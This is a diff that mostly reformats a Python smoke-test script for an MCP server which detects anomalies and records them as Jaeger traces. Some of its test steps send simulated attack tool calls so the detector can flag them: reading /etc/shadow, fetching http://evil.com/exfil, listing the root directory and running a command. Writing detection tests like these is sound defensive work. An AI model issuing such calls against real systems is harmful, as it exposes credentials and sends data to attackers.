@@ -49,6 +49,7 @@ def record(name: str, passed: bool, detail: str = "") -> None:
 # Helpers: MCP over SSE
 # ---------------------------------------------------------------------------
 
+
 class McpSession:
     """Minimal MCP client that speaks JSON-RPC over the SSE transport.
 
@@ -136,6 +137,7 @@ class McpSession:
 # Helpers: Jaeger
 # ---------------------------------------------------------------------------
 
+
 def poll_jaeger_for_flag(flag: str, timeout: float = JAEGER_POLL_TIMEOUT) -> bool:
     """Poll Jaeger API until a span with the given anomaly flag is found."""
     deadline = time.monotonic() + timeout
@@ -165,6 +167,7 @@ def poll_jaeger_for_flag(flag: str, timeout: float = JAEGER_POLL_TIMEOUT) -> boo
 # Test steps
 # ---------------------------------------------------------------------------
 
+
 def test_healthz() -> None:
     """T1: Health check returns 200."""
     try:
@@ -191,11 +194,14 @@ def test_mcp_session() -> McpSession | None:
 
     # T3: MCP initialize handshake
     try:
-        init_resp = session.send("initialize", {
-            "protocolVersion": "2024-11-05",
-            "capabilities": {},
-            "clientInfo": {"name": "smoke-test", "version": "1.0"},
-        })
+        init_resp = session.send(
+            "initialize",
+            {
+                "protocolVersion": "2024-11-05",
+                "capabilities": {},
+                "clientInfo": {"name": "smoke-test", "version": "1.0"},
+            },
+        )
         has_result = "result" in init_resp
         record("mcp_initialize", has_result, json.dumps(init_resp.get("result", {}))[:200])
 
@@ -261,14 +267,20 @@ def test_exfiltration_chain(session: McpSession | None) -> None:
         return
 
     try:
-        session.send("tools/call", {
-            "name": "read_file",
-            "arguments": {"path": "/etc/shadow"},
-        })
-        session.send("tools/call", {
-            "name": "fetch_url",
-            "arguments": {"url": "http://evil.com/exfil"},
-        })
+        session.send(
+            "tools/call",
+            {
+                "name": "read_file",
+                "arguments": {"path": "/etc/shadow"},
+            },
+        )
+        session.send(
+            "tools/call",
+            {
+                "name": "fetch_url",
+                "arguments": {"url": "http://evil.com/exfil"},
+            },
+        )
     except Exception as exc:
         record("exfiltration_chain_calls", False, str(exc))
         return
@@ -283,11 +295,14 @@ def test_privilege_escalation(session: McpSession | None) -> None:
     fresh = McpSession()
     try:
         fresh.connect()
-        fresh.send("initialize", {
-            "protocolVersion": "2024-11-05",
-            "capabilities": {},
-            "clientInfo": {"name": "smoke-privesc", "version": "1.0"},
-        })
+        fresh.send(
+            "initialize",
+            {
+                "protocolVersion": "2024-11-05",
+                "capabilities": {},
+                "clientInfo": {"name": "smoke-privesc", "version": "1.0"},
+            },
+        )
         if fresh.endpoint:
             httpx.post(
                 fresh.endpoint,
@@ -297,15 +312,21 @@ def test_privilege_escalation(session: McpSession | None) -> None:
             )
 
         # First call: filesystem category
-        fresh.send("tools/call", {
-            "name": "list_directory",
-            "arguments": {"path": "/"},
-        })
+        fresh.send(
+            "tools/call",
+            {
+                "name": "list_directory",
+                "arguments": {"path": "/"},
+            },
+        )
         # Second call: exec category -- should trigger privilege_escalation
-        fresh.send("tools/call", {
-            "name": "run_command",
-            "arguments": {"command": "id"},
-        })
+        fresh.send(
+            "tools/call",
+            {
+                "name": "run_command",
+                "arguments": {"command": "id"},
+            },
+        )
     except Exception as exc:
         record("privilege_escalation_calls", False, str(exc))
         fresh.close()
@@ -319,6 +340,7 @@ def test_privilege_escalation(session: McpSession | None) -> None:
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
+
 
 def main() -> None:
     print("=" * 60)
